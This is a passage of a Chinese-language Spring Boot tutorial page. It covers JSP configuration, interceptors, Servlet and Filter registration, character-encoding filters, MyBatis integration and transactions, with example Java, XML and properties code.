class="string">www.bjpowernode.com</span></span><br><span class="line"><span class="attr">school.address</span>=<span class="string">北京的大兴区</span></span><br><span class="line"></span><br><span class="line"><span class="attr">site</span>=<span class="string">www.bjpowernode.com</span></span><br></pre></td></tr></table></figure><h2 id="2-7-使用jsp"><a href="#2-7-使用jsp" class="headerlink" title="2.7  使用jsp"></a>2.7  使用jsp</h2><p>SpringBoot不推荐使用jsp ，而是使用模板技术代替jsp</p><p>使用jsp需要配置：</p><p>1） 加入一个处理jsp的依赖。 负责编译jsp文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2)如果需要使用servlet， jsp，jstl的功能</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3)创建一个存放jsp的目录，一般叫做webapp</p><p>​    index.jsp</p><p>4)需要在pom.xml指定jsp文件编译后的存放目录。</p><p>  META-INF&#x2F;resources</p><p>5）创建Controller， 访问jsp</p><p>6）在application.propertis文件中配置视图解析器</p><h2 id="2-8-使用容器"><a href="#2-8-使用容器" class="headerlink" title="2.8 使用容器"></a>2.8 使用容器</h2><p>你想通过代码，从容器中获取对象。</p><p>通过SpringApplication.run(Application.class, args); 返回值获取容器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(Class&lt;?&gt; primarySource, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> run(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;primarySource&#125;, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ConfigurableApplicationContext : 接口，是ApplicationContext的子接口</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ConfigurableApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span></span><br></pre></td></tr></table></figure><h2 id="2-9-ComnandLineRunner-接口-，-ApplcationRunner接口"><a href="#2-9-ComnandLineRunner-接口-，-ApplcationRunner接口" class="headerlink" title="2.9 ComnandLineRunner 接口 ，  ApplcationRunner接口"></a>2.9 ComnandLineRunner 接口 ，  ApplcationRunner接口</h2><p>这两个接口都 有一个run方法。 执行时间在容器对象创建好后， 自动执行run（）方法。</p><p>可以完成自定义的在容器对象创建好的一些操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CommandLineRunner</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ApplicationRunner</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="第三章-Web组件"><a href="#第三章-Web组件" class="headerlink" title="第三章 Web组件"></a>第三章 Web组件</h1><p>讲三个内容： 拦截器， Servlet ，Filter</p><h2 id="3-1-拦截器"><a href="#3-1-拦截器" class="headerlink" title="3.1 拦截器"></a>3.1 拦截器</h2><p>拦截器是SpringMVC中一种对象，能拦截器对Controller的请求。</p><p>拦截器框架中有系统的拦截器， 还可以自定义拦截器。  实现对请求预先处理。</p><p>实现自定义拦截器：</p><ol><li>创建类实现SpringMVC框架的HandlerInterceptor接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.需在SpringMVC的配置文件中，声明拦截器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">    &lt;mvc:path=&quot;url&quot; /&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;拦截器类全限定名称&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot中注册拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAppConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加拦截器对象， 注入到容器中</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建拦截器对象</span></span><br><span class="line">        <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoginInterceptor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//指定拦截的请求uri地址</span></span><br><span class="line">        String path []= &#123;<span class="string">&quot;/user/**&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//指定不拦截的地址</span></span><br><span class="line">        String excludePath  [] = &#123;<span class="string">&quot;/user/login&quot;</span>&#125;;</span><br><span class="line">        registry.addInterceptor(interceptor)</span><br><span class="line">                .addPathPatterns(path)</span><br><span class="line">                .excludePathPatterns(excludePath);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-Servlet"><a href="#3-2-Servlet" class="headerlink" title="3.2  Servlet"></a>3.2  Servlet</h2><p>在SpringBoot框架中使用Servlet对象。</p><p>使用步骤：</p><ol><li>创建Servlet类。 创建类继承HttpServlet</li><li>注册Servlet ，让框架能找到Servlet</li></ol><p> 例子：</p><p>1.创建自定义Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Servlet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doPost(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">       <span class="comment">//使用HttpServletResponse输出数据，应答结果</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span>  <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;===执行的是Servlet==&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>注册Servlet</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebApplictionConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义方法， 注册Servlet对象</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">servletRegistrationBean</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public ServletRegistrationBean(T servlet, String... urlMappings)</span></span><br><span class="line">        <span class="comment">//第一个参数是 Servlet对象， 第二个是url地址</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ServletRegistrationBean bean =</span></span><br><span class="line">                <span class="comment">//new ServletRegistrationBean( new MyServlet(),&quot;/myservlet&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ServletRegistrationBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>();</span><br><span class="line">        bean.setServlet( <span class="keyword">new</span> <span class="title class_">MyServlet</span>());</span><br><span class="line">        bean.addUrlMappings(<span class="string">&quot;/login&quot;</span>,<span class="string">&quot;/test&quot;</span>); <span class="comment">// &lt;url-pattern&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-过滤器Filter"><a href="#3-3-过滤器Filter" class="headerlink" title="3.3 过滤器Filter"></a>3.3 过滤器Filter</h2><p>Filter是Servlet规范中的过滤器，可以处理请求， 对请求的参数， 属性进行调整。 常常在过滤器中处理字符编码</p><p>在框架中使用过滤器：</p><ol><li>创建自定义过滤器类</li><li>注册Filter过滤器对象</li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义过滤器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了MyFilter，doFilter &quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebApplicationConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">filterRegistrationBean</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">FilterRegistrationBean</span> <span class="variable">bean</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">        bean.setFilter( <span class="keyword">new</span> <span class="title class_">MyFilter</span>());</span><br><span class="line">        bean.addUrlPatterns(<span class="string">&quot;/user/*&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-字符集过滤器"><a href="#3-4-字符集过滤器" class="headerlink" title="3.4 字符集过滤器"></a>3.4 字符集过滤器</h2><p>CharacterEncodingFilter : 解决post请求中乱码的问题</p><p>在SpringMVC框架， 在web.xml 注册过滤器。 配置他的属性。 </p><p>第一种方式：</p><p>使用步骤：</p><p>1.配置字符集过滤器</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSystemConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册Servlet</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">servletRegistrationBean</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MyServlet</span> <span class="variable">myServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyServlet</span>();</span><br><span class="line">        <span class="type">ServletRegistrationBean</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(myServlet,<span class="string">&quot;/myservlet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> reg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册Filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">filterRegistrationBean</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">FilterRegistrationBean</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用框架中的过滤器类</span></span><br><span class="line">        <span class="type">CharacterEncodingFilter</span> <span class="variable">filter</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharacterEncodingFilter</span>();</span><br><span class="line">        <span class="comment">//指定使用的编码方式</span></span><br><span class="line">        filter.setEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">//指定request ， response都使用encoding的值</span></span><br><span class="line">        filter.setForceEncoding(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        reg.setFilter(filter);</span><br><span class="line">        <span class="comment">//指定 过滤的url地址</span></span><br><span class="line">        reg.addUrlPatterns(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> reg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.修改application.properties文件， 让自定义的过滤器起作用</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SpringBoot中默认已经配置了CharacterEncodingFilter。 编码默认ISO-8859-1</span></span><br><span class="line"><span class="comment">#设置enabled=false 作用是关闭系统中配置好的过滤器， 使用自定义的CharacterEncodingFilter</span></span><br><span class="line"><span class="attr">server.servlet.encoding.enabled</span>=<span class="string">false</span></span><br></pre></td></tr></table></figure><p>第二种方式</p><p>修改application.properties文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">9001</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/myboot</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#让系统的CharacterEncdoingFilter生效</span></span><br><span class="line"><span class="attr">server.servlet.encoding.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="comment">#指定使用的编码方式</span></span><br><span class="line"><span class="attr">server.servlet.encoding.charset</span>=<span class="string">utf-8</span></span><br><span class="line"><span class="comment">#强制request，response都使用charset属性的值</span></span><br><span class="line"><span class="attr">server.servlet.encoding.force</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure><h1 id="第四章-ORM-操作-MySQL"><a href="#第四章-ORM-操作-MySQL" class="headerlink" title="第四章 ORM 操作 MySQL"></a>第四章 ORM 操作 MySQL</h1><p>使用MyBatis框架操作数据，  在SpringBoot框架集成MyBatis</p><p>使用步骤：</p><ol><li><p>mybatis起步依赖 ： 完成mybatis对象自动配置， 对象放在容器中</p></li><li><p>pom.xml 指定把src&#x2F;main&#x2F;java目录中的xml文件包含到classpath中</p></li><li><p>创建实体类Student</p></li><li><p>创建Dao接口 StudentDao , 创建一个查询学生的方法 </p></li><li><p>创建Dao接口对应的Mapper文件， xml文件， 写sql语句</p></li><li><p>创建Service层对象， 创建StudentService接口和他的实现类。 去dao对象的方法。完成数据库的操作</p></li><li><p>创建Controller对象，访问Service。</p></li><li><p>写application.properties文件</p><p>配置数据库的连接信息。</p></li></ol><h3 id="第一种方式-：-Mapper"><a href="#第一种方式-：-Mapper" class="headerlink" title="第一种方式 ： @Mapper"></a>第一种方式 ： @Mapper</h3><p>@Mapper：放在dao接口的上面， 每个接口都需要使用这个注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Mapper</span>：告诉MyBatis这是dao接口，创建此接口的代理对象。</span></span><br><span class="line"><span class="comment"> *     位置：在类的上面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentDao</span> &#123;</span><br><span class="line"></span><br><span class="line">    Student <span class="title function_">selectById</span><span class="params">(<span class="meta">@Param(&quot;stuId&quot;)</span> Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第二种方式-MapperScan"><a href="#第二种方式-MapperScan" class="headerlink" title="第二种方式  @MapperScan"></a>第二种方式  @MapperScan</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@MapperScan</span>: 找到Dao接口和Mapper文件</span></span><br><span class="line"><span class="comment"> *     basePackages：Dao接口所在的包名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(basePackages = &#123;&quot;com.bjpowernode.dao&quot;,&quot;com.bjpowernode.mapper&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第三种方式：-Mapper文件和Dao接口分开管理"><a href="#第三种方式：-Mapper文件和Dao接口分开管理" class="headerlink" title="第三种方式： Mapper文件和Dao接口分开管理"></a>第三种方式： Mapper文件和Dao接口分开管理</h3><p> 现在把Mapper文件放在resources目录下</p><p>1）在resources目录中创建子目录 （自定义的） ， 例如mapper</p><p>2）把mapper文件放到 mapper目录中</p><p>3）在application.properties文件中，指定mapper文件的目录</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定mapper文件的位置</span></span><br><span class="line"><span class="attr">mybatis.mapper-locations</span>=<span class="string">classpath:mapper/*.xml</span></span><br><span class="line"><span class="comment">#指定mybatis的日志</span></span><br><span class="line"><span class="attr">mybatis.configuration.log-impl</span>=<span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure><p>4）在pom.xml中指定 把resources目录中的文件 ， 编译到目标目录中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--resources插件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第四个-事务"><a href="#第四个-事务" class="headerlink" title="第四个  事务"></a>第四个  事务</h3><p>Spring框架中的事务：</p><p>1） 管理事务的对象： 事务管理器（接口， 接口有很多的实现类）</p><p>​      例如：使用Jdbc或mybatis访问数据库，使用的事务管理器：DataSourceTransactionManager</p><p>2 ) 声明式事务：  在xml配置文件或者使用注解说明事务控制的内容</p><p>​     控制事务： 隔离级别，传播行为， 超时时间</p><p>3）事务处理方式：</p><p>​      1） Spring框架中的@Transactional</p><p>​      2） aspectj框架可以在xml配置文件中，声明事务控制的内容</p><p>​    </p><p>SpringBoot中使用事务： 上面的两种方式都可以。</p><p>1）在业务方法的上面加入@Transactional ,  加入注解后，方法有事务功能了。</p><p>2）明确的在 主启动类的上面 ，加入@EnableTransactionManager</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Transactional</span>: 表示方法的有事务支持</span></span><br><span class="line"><span class="comment"> *       默认：使用库的隔离级别， REQUIRED 传播行为； 超时时间  -1</span></span><br><span class="line"><span class="comment"> *       抛出运行时异常，回滚事务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addStudent</span><span class="params">(Student student)</span> 